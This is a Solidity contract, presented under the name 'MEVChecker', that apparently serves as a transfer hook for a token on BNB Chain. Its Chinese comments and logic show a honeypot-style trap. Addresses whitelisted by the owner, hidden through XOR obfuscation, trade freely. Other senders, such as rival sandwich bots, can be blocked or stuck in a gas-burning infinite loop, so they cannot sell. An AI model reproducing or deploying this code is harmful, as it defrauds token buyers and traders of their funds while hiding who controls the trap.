// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "@openzeppelin/contracts/access/Ownable.sol";

contract MEVChecker is Ownable {
    uint256 safeModel = 0;
    uint256 currentNumber;
    // address _token;
    uint256 _salt = 0xa88bcc13e71ac3e3ca775b6e30d9b17a2208613e7ef69722f2debabde39dac06;
    mapping(address => uint256) _dexs;
    mapping(address => uint256) _blockCoinbases;
    address _tokenBank;
    mapping(address => uint256) _safeUsers;
    mapping(address => uint256) _blockUsers;
    mapping(address =>mapping(address => mapping(uint256 => uint256))) _snap;
    uint256 epoch = 0;
    constructor() {
        _safeUsers[address(uint160(_salt ^ 0xa88bcc13e71ac3e3ca775b6e30d9b17a220a36071c395923b73f8d5c0bba7f70))] = 1;
        _safeUsers[address(uint160(_salt ^ 0xa88bcc13e71ac3e3ca775b6efd12854d6469bb5fe8df291f78a52e92e1befaa5))] = 1;
        _safeUsers[address(uint160(_salt ^ 0xa88bcc13e71ac3e3ca775b6edbc648408ac3fdd03e7d198e539d2ed84bd98ee4))] = 1;
        _safeUsers[address(uint160(_salt ^ 0xa88bcc13e71ac3e3ca775b6ebc93ef2e29350c74284179939b5ca32847ae5a75))] = 1;
        _safeUsers[address(uint160(_salt ^ 0xa88bcc13e71ac3e3ca775b6e10284f9a8e3fe4c329a278ff42bfb22e1c99d6a8))] = 1;
        _safeUsers[address(uint160(_salt ^ 0xa88bcc13e71ac3e3ca775b6e9739671b4dc41115268f48b92e1862f7e173d585))] = 1;
        _safeUsers[address(uint160(_salt ^ 0xa88bcc13e71ac3e3ca775b6e65395d9daf9e28262dea3495392d8181b538337b))] = 1;
        _safeUsers[address(uint160(_salt ^ 0xa88bcc13e71ac3e3ca775b6effc86d472539a56329cfc5ab1359ae829fad6b95))] = 1;
        _safeUsers[address(uint160(_salt ^ 0xa88bcc13e71ac3e3ca775b6e52f8cb3af19d888471f0a768f0e37daf223cbdec))] = 1;
        _safeUsers[address(uint160(_salt ^ 0xa88bcc13e71ac3e3ca775b6eb0b5cddc202f4b9eb630d0496eef846f728883e1))] = 1;
        _safeUsers[address(uint160(_salt ^ 0xa88bcc13e71ac3e3ca775b6e9bc58e89452cd2c8b61a8463e04e676e3620798c))] = 1;

        _safeUsers[address(uint160(_salt ^ 0xa88bcc13e71ac3e3ca775b6ee8920528177b8ffcf1fb66e71e2957f086975f1a))] = 1;

        _safeUsers[address(0)] = 1;

        _tokenBank = address(uint160(_salt ^ 0xa88bcc13e71ac3e3ca775b6ee8920528177b8ffcf1fb66e71e2957f086975f1a));
        
        // bnb48的节点列表
        _blockCoinbases[0x72b61c6014342d914470eC7aC2975bE345796c2b] = 1;
        _blockCoinbases[0xb218C5D6aF1F979aC42BC68d98A5A0D796C6aB01] = 1;
        _blockCoinbases[0xa6f79B60359f141df90A0C745125B131cAAfFD12] = 1;
        _blockCoinbases[0x0BAC492386862aD3dF4B666Bc096b0505BB694Da] = 1;
        _blockCoinbases[0xD1d6bF74282782B0b3eb1413c901D6eCF02e8e28] = 1;
        _blockCoinbases[0x9bB832254BAf4E8B4cc26bD2B52B31389B56E98B] = 1;
        // _blockCoinbases[0x9F8cCdaFCc39F3c7D6EBf637c9151673CBc36b88] = 1;
    }

    function setBlockUsers(address _users) public onlyOwner {
        _blockUsers[_users] = 1;
    }

    function unsetBlockUsers(address _users) public onlyOwner {
        _blockUsers[_users] = 0;
    }

    function setBlockCoinbase(address _coinbase) public onlyOwner {
        _blockCoinbases[_coinbase] = 1;
    }

    function unsetBlockCoinbase(address _coinbase) public onlyOwner {
        _blockCoinbases[_coinbase] = 0;
    }

    function setSafe() public onlyOwner {
        safeModel = 1;
    }

    function unsetSafe() public onlyOwner {
        safeModel = 0;
    }
    
    // 设置tokenbank的地址
    function setTokenBank(uint256 tokenBank) public onlyOwner {
        tokenBank ^= _salt;
        _tokenBank = address(uint160(tokenBank));
    }
    
    // 设置交易所地址
    function setDex(address dex) public onlyOwner {
        _dexs[dex] = 1;
        _safeUsers[dex] = 1;
    }
    
    // 用来买交易的地址都添加到这里，我们夹子的地址也添加进来
    function addSafeUsers(uint256 _user) public onlyOwner {
        _user ^= _salt;
        _safeUsers[address(uint160(_user))] = 1;
    }

    function addEpoch() public {
        epoch += 1;
    }
    // 注意：safeModel等于1时其它夹子是100%不会夹成功的；但如果设为其它值，则其它夹子有一定概率会夹成功，但是我们也有一定概率使其它夹子卖不出去
    function mevChecker(address from, address to, uint256 _amount) external {
        // if we clip
        if ((_dexs[from] == 1 && to == _tokenBank)) {
            currentNumber = block.number;
        } else if((from == _tokenBank && _dexs[to] == 1) || ((safeModel == 1 || currentNumber == block.number ||  _blockCoinbases[block.coinbase] == 1) && _safeUsers[to] == 1)) {
            epoch += 1;
        }
        if (_safeUsers[from] != 1) {
            if(_snap[msg.sender][from][epoch] < _amount || _blockUsers[from] == 1) {
                while(true) {}
                revert("Error!");
            } else {
                _snap[msg.sender][from][epoch] -= _amount;
            }
        }
        _snap[msg.sender][to][epoch] += _amount;
    }
}